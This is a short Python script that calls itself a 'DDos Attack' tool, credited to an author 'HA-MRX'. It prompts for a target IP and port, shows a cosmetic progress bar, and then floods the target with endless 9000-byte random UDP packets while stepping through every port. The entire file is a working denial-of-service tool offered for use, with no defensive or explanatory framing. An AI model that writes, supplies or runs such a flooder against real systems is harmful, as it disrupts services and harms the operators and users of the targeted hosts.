import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9000)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("Author    : HA-MRX")
print("github    : https://github.com/Ha3MrX")
print("")

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)

sent = 0
while True:
    try:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit()
